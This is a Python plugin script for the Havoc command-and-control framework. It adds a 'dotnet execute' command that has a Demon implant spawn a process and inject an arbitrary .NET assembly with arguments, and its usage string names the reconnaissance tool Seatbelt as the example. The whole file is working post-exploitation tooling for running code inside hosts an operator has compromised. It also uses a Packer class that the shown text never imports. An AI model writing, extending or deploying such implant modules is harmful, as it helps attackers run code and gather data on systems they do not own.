
from havoc import Demon, RegisterCommand

def InvokeAssembly( demonID, *param ):
    TaskID   : str    = None
    demon    : Demon  = None
    Assembly : str    = None
    packer   = Packer()

    demon  = Demon( demonID )

    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable" )
    
    if len( param ) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return

    try:
        Assembly = open( param[ 0 ], 'rb' )

        packer.addstr( "DefaultAppDomain" )
        packer.addstr( "v4.0.30319" )
        packer.addstr( str(Assembly.read()) )
        packer.addstr( " " + ''.join( param[ 1: ] ) )

    except OSError:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
        return

    arg = packer.getbuffer() 

    demon.DllSpawn( TaskID, f"bin/InvokeAssembly.{demon.ProcessArch}.dll", arg )

    return TaskID

RegisterCommand( InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user" )
